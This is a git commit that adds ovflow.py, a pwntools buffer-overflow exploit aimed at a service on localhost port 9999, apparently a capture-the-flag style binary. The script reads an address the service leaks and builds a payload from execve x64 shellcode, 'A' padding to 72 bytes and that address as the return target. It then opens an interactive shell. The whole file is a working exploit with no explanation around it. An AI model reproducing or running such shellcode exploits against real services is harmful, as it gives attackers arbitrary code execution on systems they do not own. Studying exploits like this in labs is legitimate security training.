8f6d01e3b6f284786fa5a24d7f8db8a99bfdbb09
ABDULLAH BAGHUTH <36686812+abdullah-baghuth@users.noreply.github.com>
2020-11-14 13:23:59 -0500

    Add files via upload

---
+++ ovflow.py
@@ -0,0 +1,17 @@
+#!/usr/bin/python
+from pwn import *
+p = remote('127.0.0.1', 9999)
+# receive until we see this text
+p.recvuntil("Oops, I'm leaking! ")
+# store leaked libc base address
+leak=int(p.recvuntil("\n"),16)
+log.info('Libc address: {}'.format(hex(leak)))
+p.recvuntil("> ")
+# execve x64 shellcode 30 bytes - https://www.exploit-db.com/exploits/37362/
+payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+payload += "A"*(72-len(payload))
+#c = str(p64(leak))
+#payload += c
+payload += p64(leak)
+p.sendline (payload)
+p.interactive()
